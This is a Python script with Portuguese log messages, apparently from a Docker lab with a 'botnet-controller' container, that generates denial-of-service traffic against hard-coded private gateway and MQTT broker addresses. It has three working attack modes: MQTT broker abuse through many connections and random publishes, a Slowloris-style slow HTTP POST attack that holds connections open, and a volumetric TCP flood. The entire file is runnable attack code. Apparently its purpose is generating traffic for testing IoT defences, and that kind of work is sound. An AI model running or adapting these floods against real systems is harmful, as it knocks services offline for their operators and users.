import argparse
import random
import socket
import string
import time
import sys

GATEWAY_HOST = "172.30.0.10"
GATEWAY_PORT = 8080
MQTT_HOST = "172.30.0.20"
MQTT_PORT = 1883


def random_payload(size):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size)).encode()


def mqtt_abuse(args):
    try:
        import paho.mqtt.client as mqtt
    except Exception as e:
        print("[ERRO] paho-mqtt não está instalado no container.")
        print("Erro:", e)
        print("Instale com: docker compose exec botnet-controller pip install paho-mqtt")
        sys.exit(1)

    print("[RODADA3] Iniciando mqtt_abuse com reconexões")
    print(f"[INFO] connections={args.connections}, messages_per_conn={args.messages_per_conn}, topics={args.topics}, payload_size={args.payload_size}")

    for i in range(args.connections):
        client_id = f"mqtt-abuse-r3-{i}-{random.randint(1000,9999)}"
        client = mqtt.Client(client_id=client_id)

        try:
            client.connect(MQTT_HOST, MQTT_PORT, keepalive=10)
            client.loop_start()

            for j in range(args.messages_per_conn):
                topic_id = random.randint(1, args.topics)
                topic = f"iot/abuse/r3/topic/{topic_id}"
                payload = random_payload(args.payload_size)
                client.publish(topic, payload, qos=0)
                time.sleep(args.msg_delay)

            client.loop_stop()
            client.disconnect()

        except Exception as e:
            print(f"[ALERTA] Falha MQTT conexão {i}: {e}")

        time.sleep(args.conn_delay)

    print("[OK] mqtt_abuse finalizado")


def slow_dos(args):
    print("[RODADA3] Iniciando slow_dos com mais conexões")
    print(f"[INFO] connections={args.connections}, chunks={args.chunks}, chunk_delay={args.chunk_delay}, hold_time={args.hold_time}")

    sockets = []

    for i in range(args.connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((GATEWAY_HOST, GATEWAY_PORT))

            initial = (
                f"POST /telemetry HTTP/1.1\r\n"
                f"Host: {GATEWAY_HOST}\r\n"
                f"User-Agent: slow-dos-r3-{i}\r\n"
                f"Content-Length: {args.payload_size * args.chunks * 2}\r\n"
                f"Content-Type: application/octet-stream\r\n"
            ).encode()

            s.sendall(initial)
            sockets.append(s)

        except Exception as e:
            print(f"[ALERTA] Falha ao abrir conexão slow_dos {i}: {e}")

        time.sleep(args.open_delay)

    print(f"[INFO] Conexões abertas: {len(sockets)}")

    for chunk_round in range(args.chunks):
        print(f"[INFO] Enviando chunk {chunk_round+1}/{args.chunks}")
        for s in list(sockets):
            try:
                s.sendall(random_payload(args.payload_size))
            except Exception:
                try:
                    sockets.remove(s)
                except Exception:
                    pass
        time.sleep(args.chunk_delay)

    print(f"[INFO] Mantendo conexões por {args.hold_time}s")
    time.sleep(args.hold_time)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("[OK] slow_dos finalizado")


def flood(args):
    print("[RODADA3] Iniciando dos_flood volumétrico")
    print(f"[INFO] connections={args.connections}, bursts={args.bursts}, payload_size={args.payload_size}, delay={args.delay}")

    for i in range(args.connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((GATEWAY_HOST, GATEWAY_PORT))

            for b in range(args.bursts):
                payload = b"FLOOD_R3_" + random_payload(args.payload_size)
                s.sendall(payload)
                time.sleep(args.burst_delay)

            s.close()

        except Exception:
            pass

        time.sleep(args.delay)

    print("[OK] dos_flood finalizado")


def main():
    parser = argparse.ArgumentParser(description="Geradores corrigidos da Rodada 3")
    sub = parser.add_subparsers(dest="mode", required=True)

    mqtt_p = sub.add_parser("mqtt_abuse")
    mqtt_p.add_argument("--connections", type=int, default=80)
    mqtt_p.add_argument("--messages-per-conn", type=int, default=5)
    mqtt_p.add_argument("--topics", type=int, default=10)
    mqtt_p.add_argument("--payload-size", type=int, default=200)
    mqtt_p.add_argument("--msg-delay", type=float, default=0.01)
    mqtt_p.add_argument("--conn-delay", type=float, default=0.02)

    slow_p = sub.add_parser("slow_dos")
    slow_p.add_argument("--connections", type=int, default=40)
    slow_p.add_argument("--chunks", type=int, default=8)
    slow_p.add_argument("--chunk-delay", type=float, default=2.0)
    slow_p.add_argument("--hold-time", type=float, default=25.0)
    slow_p.add_argument("--payload-size", type=int, default=20)
    slow_p.add_argument("--open-delay", type=float, default=0.05)

    flood_p = sub.add_parser("flood")
    flood_p.add_argument("--connections", type=int, default=300)
    flood_p.add_argument("--bursts", type=int, default=5)
    flood_p.add_argument("--payload-size", type=int, default=500)
    flood_p.add_argument("--delay", type=float, default=0.001)
    flood_p.add_argument("--burst-delay", type=float, default=0.001)

    args = parser.parse_args()

    if args.mode == "mqtt_abuse":
        mqtt_abuse(args)
    elif args.mode == "slow_dos":
        slow_dos(args)
    elif args.mode == "flood":
        flood(args)


if __name__ == "__main__":
    main()
